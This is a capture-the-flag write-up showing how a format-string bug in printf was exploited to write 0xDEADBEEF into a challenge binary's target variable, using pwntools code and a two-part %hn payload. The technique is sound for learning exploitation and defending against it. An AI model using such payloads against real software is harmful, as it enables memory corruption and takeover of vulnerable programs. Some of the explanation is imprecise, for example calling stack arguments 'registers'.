# Challenge `Write Big Numbers` Writeup

- Vulnerability: 
  - Format strings
- Where:
  - printf function
- Impact:
  - allows to write in arbitrary memory

## Steps to reproduce

Sending the following format string
```
"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```
we can verify that the 7th register is filled with `41414141` (the value of `AAAA`) which tells us that we control the 7th register.

To get the address of the `target` variable we use:
```py
elf = ELF("06_write_big_number")
target_address = elf.symbols['target']
```

This time, we must write a big number, composed of 8 bytes, to the most significant byte of the target variable. To do so, we must use the `h` modifier which allows us to write 2 bytes at a time. The payload is then:

```py
io = connect(HOST, PORT)
payload =  p32(adr) + p32(adr + 2) + b"%48871x%7$hn" + b"%8126x%8$hn"
io.sendline(payload)
```

To achieve this we must specify their addresses. This is why we write to the 7th register first, and then to the 8th register. Then, since we want to write `"0xDEADBEEF"` to the target variable and we are already writing the 4 bytes by specifying the addresses, we must write `0xBEEF - 8 (bytes -> each p32() is 4 bytes)` to the 7th register and `0xDEAD - 0xBEEF` to the 8th register. This way, we will write `0xDEADBEEF` to the target variable and we guarantee that we are writing to the specific byte we want. Sending this payload, we get the flag.

## Implementation

Full implementation can be found [here](write-big-numbers.py).